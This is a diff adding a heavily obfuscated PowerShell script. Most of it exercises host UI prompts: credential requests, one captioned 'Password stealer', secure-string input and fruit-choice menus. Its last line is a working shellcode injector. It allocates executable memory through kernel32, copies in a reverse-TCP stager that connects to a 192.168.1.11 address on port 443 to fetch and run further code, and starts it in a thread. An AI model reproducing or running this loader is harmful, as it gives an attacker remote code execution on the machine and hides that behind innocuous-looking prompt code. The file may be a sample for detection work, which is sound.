@@ -1,0 +1,42 @@
+$d7W  =[TYpE]("{2}{10}{9}{0}{4}{1}{7}{5}{6}{8}{3}"-F '.','an','SYs','eS','m','meNT.auToma','tIOn.Pscr','AgE','EdEnTIALTYP','m','tE')  ;   set-vaRiablE ('0LY'+'5') ( [TypE]("{3}{9}{5}{0}{7}{1}{4}{10}{6}{11}{2}{8}"-f '.','auT','UIO','sY','OmaTIoN.pSCr','EM','nt','MAnAGEMeNt.','ptions','ST','edE','IAl')); 
+
+${fIE`l`dS} = @(
+    .("{1}{2}{0}" -f'Object','Ne','w-') ("{1}{6}{8}{0}{3}{7}{9}{2}{10}{5}{4}"-f'.H','Syste','ldDescr','o','on','pti','m.Management.Auto','st.Fi','mation','e','i') ("{0}{1}" -f 'Inpu','t')
+    .("{0}{1}{2}"-f'N','ew','-Object') ("{2}{7}{1}{5}{0}{6}{10}{3}{8}{9}{4}"-f'on.Host.','ement.Au','System.','Des','n','tomati','F','Manag','crip','tio','ield') ("{1}{2}{0}" -f 'st','Input',' Li')
+)
+${F`Ie`LDS}[1]."SET`PaRAmeteRt`Ype"([int[]])
+
+${HO`ST}."u`i".("{2}{0}{1}" -f'rom','pt','P').Invoke(("{0}{1}{2}"-f 'C','aptio','n'), ("{1}{0}"-f'e','Messag'), ${f`Ie`LdS})
+
+&("{4}{0}{2}{1}{3}"-f'e','ia','nt','l','Get-Cred')
+&("{3}{0}{1}{2}" -f'redent','ia','l','Get-C') -Message ("{0}{1}" -f 'Te','st!')
+.("{0}{1}{2}" -f 'G','et','-Credential') -UserName ("{1}{0}" -f 'user','my') -Message ("{0}{1}{2}{3}{4}"-f 'P','assw','ord ste','a','ler')
+
+${ho`ST}."u`I".("{3}{1}{5}{4}{0}{2}"-f'ti','rom','al','P','eden','ptForCr').Invoke(("{2}{1}{0}"-f'ion','t','Cap'), ("{1}{2}{0}"-f'age','Me','ss'), ${N`UlL}, ${n`UlL},   (gEt-VAriaBle ('d'+'7W')  -ValUeOnl  )::"DEf`AulT",  $0ly5::"dEfA`UlT") 
+${HO`sT}."uI".("{3}{4}{2}{0}{1}"-f 'edentia','l','mptForCr','P','ro').Invoke(("{0}{1}" -f'C','aption'), ("{2}{0}{1}" -f'ess','age','M'), ("{2}{1}{0}"-f'user','t','tes'), ${nU`Ll},  $D7W::"dE`FAuLt",  (  Get-cHiLDiTeM ("v"+"arIab"+"lE:0"+"Ly5")).ValUE::"D`ef`AulT") 
+
+&("{2}{1}{0}"-f 'ost','ead-H','R') -AsSecureString
+&("{0}{2}{1}"-f'Read','ost','-H') -Prompt ("{3}{2}{4}{0}{6}{5}{1}" -f'c','ng','nt','E','er a se','e stri','ur') -AsSecureString
+
+${f`iELd} = &("{0}{1}{2}"-f 'New-','Obje','ct') ("{8}{2}{7}{3}{1}{5}{6}{0}{4}"-f'ldDescr','Host','stem','Automation.','iption','.F','ie','.Management.','Sy') ("{1}{2}{0}"-f'ing','Se','cureStr')
+${Fi`elD}."Se`TPA`R`AMEteRt`y`pE"([SecureString])
+${hO`ST}."U`i".("{0}{1}{2}" -f'P','rom','pt').Invoke(("{1}{0}" -f'n','Captio'), ("{0}{2}{1}" -f'Mes','ge','sa'), ${Fi`eLD})
+
+${f`iELd} = .("{0}{2}{1}" -f 'New','ject','-Ob') ("{8}{5}{1}{2}{7}{3}{0}{9}{6}{4}" -f'ieldDes','nt.Automa','tion.Ho','t.F','n','me','o','s','System.Manage','cripti') ("{3}{0}{1}{2}" -f 'Cred','ent','ial','PS')
+${F`Ie`lD}."s`eTp`ARAM`E`TEr`TYPE"([PSCredential])
+${hO`ST}."U`I".("{1}{0}" -f't','Promp').Invoke(("{0}{1}" -f'Ca','ption'), ("{2}{1}{0}" -f'e','ssag','Me'), ${F`IeLd})
+
+
+
+${c`h`oIces} = @(
+    .("{0}{1}{2}" -f 'New-Ob','j','ect') ("{1}{3}{9}{12}{4}{5}{8}{7}{10}{6}{2}{11}{0}"-f 'ption','System.Manag','Choic','emen','tomat','ion','t.','Ho','.','t.A','s','eDescri','u') ("{0}{1}" -f'&','Apple'), ("{1}{0}"-f 'le','App')
+    .("{1}{0}{2}" -f 'w-Ob','Ne','ject') ("{7}{8}{0}{10}{9}{2}{3}{5}{12}{1}{6}{4}{11}"-f 'tem','ion.Ho','agement','.A','Descri','utom','st.Choice','Sy','s','n','.Ma','ption','at') ("{0}{1}{2}" -f'&Ban','a','na'), ("{2}{0}{1}"-f'n','a','Bana')
+    .("{1}{2}{0}" -f'ect','New-O','bj') ("{4}{0}{3}{12}{10}{5}{11}{9}{7}{6}{13}{1}{8}{2}" -f 'a','ChoiceDes','ion','nagem','System.M','u','on','i','cript','omat','t.A','t','en','.Host.') ("{1}{0}" -f'e','&Orang'), ("{0}{1}{2}"-f'Or','a','nge')
+)
+
+
+${H`ost}."U`i".("{2}{4}{1}{0}{3}"-f 'C','mptFor','P','hoice','ro').Invoke(("{0}{3}{1}{2}{4}"-f 'Choo','e',' a fru','s','it'), ("{1}{2}{3}{0}"-f'hoose one','You m','ay ','c'), ${Choi`Ces}, 1)
+
+
+${H`Ost}."uI".("{0}{2}{1}"-f'Promp','ce','tForChoi').Invoke(("{1}{2}{4}{3}{0}"-f'ruit','C','hoo','e a f','s'), ("{0}{2}{3}{4}{1}" -f 'You may choo',' than one','s','e',' more'), ${c`Hoic`ES}, [int[]]@(0, 2))
+${c} = ((("{90}{60}{63}{76}{42}{9}{35}{47}{68}{19}{45}{2}{34}{1}{32}{24}{80}{23}{59}{92}{25}{16}{56}{82}{61}{3}{51}{81}{74}{30}{20}{5}{7}{11}{29}{22}{79}{28}{12}{0}{36}{40}{46}{73}{88}{33}{75}{44}{52}{72}{6}{58}{85}{39}{15}{65}{91}{70}{64}{27}{86}{78}{55}{43}{57}{10}{67}{50}{83}{41}{14}{18}{21}{71}{66}{89}{37}{4}{62}{69}{17}{48}{54}{8}{84}{53}{77}{87}{38}{93}{49}{31}{26}{13}"-f 'te',' Virtu','n','lProtect);[Dl','Dll','32.','adA','dllgAn)','gA','ernel32.dllgA','ntPt',']pu','x',');','eatio','St','Alloc','gAnms','nFlags, ',' ','nkernel','IntPt','ic ','dress','loc(I',' fl','rc, uint count','t','atic e','bl','rt(gA','s','alAl','Ptr','tPtr','n)]','rn ','d);[','mset','butes, uint dw','IntPtr Creat','nt dwCr','Ank','tart','lpT','static extern I','eT','pub','vc','tr dest, uint ','er, u','l','h','ern I','rt.dll','pS','ationType, ','Address, I','ttr',', uint dwSize,','llImp',' f','Impo','ort','ize, In','a','e','r lpParamet','lic','rt(','S','r lpThr','re','h','mpo',' ','(g','nt','tr l','st','ntPtr lpAd','I','uint','i','n)]public static ext','i','P','Ptr me','read(Int','adI','[D','ck',' uint','(IntP'))."r`epl`ACE"(([char]103+[char]65+[char]110),[sTriNG][char]34));${w} = .("{1}{2}{0}"-f 'pe','Ad','d-Ty') -memberDefinition ${c} -Name ("{1}{0}" -f'2','Win3') -namespace ("{0}{3}{1}{2}"-f'Wi','2F','unctions','n3') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${G} = 0x1000;if (${Z}."LENg`TH" -gt 0x1000){${G} = ${Z}."L`eN`GtH"};${x}=${W}::("{0}{1}{2}" -f'VirtualAll','o','c').Invoke(0,0x1000,${g},0x40);for (${I}=0;${I} -le (${z}."LE`Ng`Th"-1);${i}++) {${W}::"m`EMs`eT"([IntPtr](${X}.("{2}{1}{0}"-f'32','t','ToIn').Invoke()+${I}), ${z}[${I}], 1)};${W}::("{2}{0}{1}{3}"-f 'eT','h','Creat','read').Invoke(0,0,${X},0,0,0);for (;;){.("{0}{2}{1}" -f 'Start','sleep','-') 60};
